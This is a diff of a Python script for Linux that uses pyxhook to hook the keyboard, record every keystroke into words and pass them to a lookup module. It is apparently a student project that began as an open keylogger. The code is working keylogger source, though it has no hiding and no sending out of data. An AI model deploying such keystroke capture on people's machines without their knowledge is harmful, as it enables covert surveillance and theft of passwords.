@@ -1,32 +1,26 @@
-"""
-Copyright (c) 2015, Aman Deep
-All rights reserved.
-
-
-A simple keylogger witten in python for linux platform
-All keystrokes are recorded in a log file.
-
-The program terminates when grave key(`) is pressed
-
-grave key is found below Esc key
-"""
 import pyxhook
 import os
+import tree
+# import unicodeWords
 
 wordList = []
 
 counter = 0
+# fob=open(log_file,'w')
+log_file = '/media/rochana/University/Acadamic/Sem 6/Project/CO328/Software-Engineering-Project-master/py-keylogger/Key.log'       #this should be change according to user preference.
+fob=open(log_file,'w')
 
 def printWord():
 	global counter
 
-	log_file = '/media/rochana/University/Acadamic/Untitled Folder/Key.log'       #this should be change according to user preference.
-	fob=open(log_file,'w')
+	
 
 	wordList.pop(counter)
 	counter-=1
+	tree.find("".join([str(x) for x in wordList] ))
 	print "".join([str(x) for x in wordList] )
-	fob.write("".join([str(x) for x in wordList] ))
+	# word = unicodeWords.identifyWorks(word)
+	# fob.write("".join([str(x) for x in wordList] ))
 	counter =0
 	del wordList[:]
 
@@ -59,11 +53,12 @@ def OnKeyPress(event):
 		
 		
 		# print(wordList[counter])
-
+		# print(u'\u0DDD\u0D9A')
+		# print(u'\u0D85\u0DB1')
 		counter += 1
 
 
-new_hook=pyxhook.HookManager()							#instantiate HookManager class
-new_hook.KeyDown=OnKeyPress							#listen to all keystrokes
-new_hook.HookKeyboard()								#hook the keyboard
-new_hook.start()								#start the session
+new_hook=pyxhook.HookManager()											#instantiate HookManager class
+new_hook.KeyDown=OnKeyPress												#listen to all keystrokes
+new_hook.HookKeyboard()													#hook the keyboard
+new_hook.start()														#start the session
